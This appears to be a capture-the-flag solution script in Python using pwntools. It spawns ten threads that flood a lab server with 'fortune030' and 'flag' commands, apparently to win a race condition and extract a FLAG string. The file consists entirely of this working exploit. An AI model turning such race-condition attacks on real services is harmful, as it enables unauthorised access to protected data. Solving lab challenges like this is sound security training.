# python3 chal_1.py 10931 up.zoolab.org

import base64
import hashlib
import time
import sys
from pwn import *
import threading
import re

def interact_with_program(r):
    i = 0
    while True:
        r.sendline("fortune030".encode())
        r.sendline("flag".encode())

        i += 1
        if i > 10:
            break
    


if __name__ == "__main__":
    r = None
    if len(sys.argv) == 2:
        r = remote('localhost', int(sys.argv[1]))
    elif len(sys.argv) == 3:
        r = remote(sys.argv[2], int(sys.argv[1]))
    else:
        r = process('./a.out')
    
    
    num_threads = 10

    # List to hold thread objects
    threads = []

    # Spawn multiple threads
    for _ in range(num_threads):
        t = threading.Thread(target=interact_with_program, args = (r,))
        t.start()
        threads.append(t)

    s = r.recvuntil('}'.encode()).decode()
    flag_match = re.search(r'FLAG{([^}]*)}', s)
    if flag_match:
        flag = flag_match.group(0)
        print(flag)
    # print(s)
    
    # Wait for all threads to finish
    for t in threads:
        t.join()

    
    
    